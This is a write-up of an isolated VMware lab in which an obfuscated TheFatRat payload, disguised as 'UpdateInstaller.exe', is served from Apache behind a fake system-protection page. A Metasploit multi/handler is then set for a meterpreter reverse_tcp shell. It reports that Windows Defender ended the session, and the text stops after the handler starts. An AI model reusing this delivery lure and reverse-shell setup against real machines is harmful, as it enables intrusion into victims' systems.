# Windows 10 Endpoint Security & Runtime Evasion Analysis Lab

## 1. Executive Summary
This laboratory environment demonstrates a local cyberattack simulation using a staged framework. The objective is to evaluate network connectivity, simulate a delivery mechanism via a local web server (Apache), and analyze endpoint response mechanisms under default Windows 10 configurations. 

The lab successfully verified initial delivery metrics and staging handshakes. However, during the runtime execution phase, the endpoint's dynamic memory protection mechanisms successfully intervened, terminating the payload process (`Session Died`). This repository documents the detailed technical timeline and structural analysis of this defense evasion testbed.

---

## 2. Infrastructure & Network Architecture

The environment was hosted inside an isolated hypervisor virtual network (VMware Workstation) consisting of two primary nodes:
* **Attacker Node:** Kali Linux 2025 (`192.168.1.3`)
* **Target Node:** Windows 10 x64 Enterprise Evaluation (`192.168.1.8`)

### Network & Route Verification
Initial network verification was established via ICMP echoing to ensure robust packet routing between the target and the host controller before initializing delivery channels.

| Metric | Value |
| :--- | :--- |
| **Ping Statistics** | 4 Sent, 4 Received, 0% Loss |
| **Avg Round-Trip Time** | 1ms |
| **Network Context** | Local Host-Only / NAT Segment |

---

## 3. Implementation Blueprint & Stages

### Stage 1: Payload Generation & Configuration
Using automated compilation frameworks, a multi-stage obfuscated executable was crafted to facilitate initial reverse staging connections.

* **Framework utilized:** TheFatRat (PwnWinds Module v1.5)
* **Target Protocol:** Multi/Handler reverse staging (`reverse_https` and `reverse_tcp`)
* **Compilation Base:** C# Wrapper Object
* **Output Target Binary:** `UpdateInstaller.exe`

### Stage 2: Local Delivery Architecture
To simulate an enterprise-level watering hole or drive-by download vector, an internal Apache2 Web Server was initialized on the host machine. The compiled artifact was deployed directly to the server's root directory: `/var/www/html/`.

A customized HTML/CSS interface was designed locally to mock an official "System Protection Action Required" notification page, mapping the binary artifact directly to user action inputs.

---

## 4. Empirical Technical Findings & Evidence

Below is the verified chronological sequence of execution captured during the laboratory testing phases:

### Phase A: Environment Discovery & Tooling Initialization
The testing environment verified host network metrics (`ifconfig`) and initialized the compilation menu configurations inside the isolated testing console.

*Diagnostic Reference:*
* Network Routing Verification: Matches local subnet masks.
* Framework Setup: Target options mapped via sequential entry menus.

### Phase B: Handler Arming & Reverse Ingress
Metasploit's multi-handler was deployed across varying configurations (`reverse_https` on port 443 and `reverse_tcp` on port 443) to intercept active callback packets.

```text
msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 192.168.1.3
msf exploit(multi/handler) > set LPORT 443
msf exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 192.168.1.3:443
